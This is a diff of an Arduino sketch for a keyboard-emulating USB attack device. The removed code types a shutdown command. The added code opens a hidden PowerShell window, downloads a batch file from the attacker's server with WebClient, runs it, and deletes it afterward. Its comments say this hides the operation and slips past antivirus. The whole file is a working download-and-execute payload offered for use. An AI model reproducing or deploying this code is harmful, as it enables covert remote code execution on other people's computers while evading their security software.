@@ -1,58 +1,63 @@
-#include <Keyboard.h>
-
+#include<Keyboard.h>
 void setup() {
   Keyboard.begin();
-  delay(1000);
+    delay(500);
+  Keyboard.press(KEY_CAPS_LOCK); 
+  Keyboard.release(KEY_CAPS_LOCK);
+   Keyboard.press(KEY_LEFT_GUI);
+   Keyboard.press('r');
+   delay(500);
+   Keyboard.release(KEY_LEFT_GUI);
+   Keyboard.release('r');
+   delay(500);
+   /*Keyboard.print("cmd");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(500);
+   Keyboard.print("powershell");
+   Keyboard.write(KEY_RETURN);
+   delay(500);*/
+   Keyboard.print("cmd /c start powershell -w hidden");//hide your operation!
+   Keyboard.write(KEY_RETURN);
+   delay(2000);
+   Keyboard.print("$clnt = new-object System.Net.WebClient");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   
+   Keyboard.print("$ad = 'http://you vps's ip/TEST.BAT'");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(500);
+   
+   Keyboard.print("$re = 'Documents\\x.bat'");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(500);
+   
+   Keyboard.print("$clnt.DownloadFile($ad,$re)");//download the bat
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(3000);
 
-Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
+   Keyboard.print(".\\Documents\\x.bat");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(1000);
 
-Keyboard.release(KEY_CAPS_LOCK); //释放大写键
+  Keyboard.print("remove-item .\\Documents\\x.bat");//start the bat and AV(such as 360..) will not notice
+   delay(500);
+  Keyboard.write(KEY_RETURN);
+    delay(500);
 
-delay(300);
+   Keyboard.print("exit");
+   delay(500);
+   Keyboard.write(KEY_RETURN);
+   delay(500);
+   
+  Keyboard.press(KEY_CAPS_LOCK); 
+  Keyboard.release(KEY_CAPS_LOCK);
+  Keyboard.end();
+}
 
-Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
-
-delay(300); 
-
-Keyboard.press('r');//按下r键 
-
-delay(300); 
-
-Keyboard.release(KEY_LEFT_GUI);//松掉win键 
-
-Keyboard.release('r');//松掉r键 
-
-delay(300); 
-
-Keyboard.println("cmd");//输入cmd进入DOS
-
-delay(300); 
-
-Keyboard.press(KEY_RETURN);  //按下回车键
-
-Keyboard.release(KEY_RETURN); //释放回车键
-
-delay(300); 
-Keyboard.println("shutdown /s /t 100");
-
-Keyboard.press(KEY_RETURN); //按下回车键
-Keyboard.release(KEY_RETURN);//释放enter键
-delay(1000);
-
-Keyboard.press(KEY_CAPS_LOCK); //按下大写键
-Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
-
-delay(500);
-
-/*Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 
-delay(300); 
-Keyboard.press('m');//按下r键 
-delay(300); 
-Keyboard.release(KEY_LEFT_GUI);//松掉win键 
-Keyboard.release('m');//松掉r键 
-delay(300); */
-
-Keyboard.end();//结束键盘通讯 
-  }
-void loop(){
-  }
+void loop() {
+}
